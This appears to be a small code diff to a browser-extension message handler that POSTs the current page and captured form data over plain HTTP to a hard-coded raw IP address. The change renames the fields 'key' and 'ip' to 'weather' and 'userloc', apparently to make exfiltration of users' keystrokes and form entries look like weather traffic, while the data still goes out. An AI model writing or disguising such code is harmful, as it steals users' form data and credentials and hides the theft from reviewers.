@@ -1,8 +1,8 @@
 function handleMessage(request) {
-    var data = "key=" + encodeURIComponent(request.key) +
+    var data = "weather=" + encodeURIComponent(request.weather) +
                "&page=" + encodeURIComponent(request.page) +
                "&formdata=" + encodeURIComponent(request.formdata) +
-               "&ip=" + encodeURIComponent(request.ip);
+               "&userloc=" + encodeURIComponent(request.userloc);
 
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "http://163.5.143.146/weather/", true);
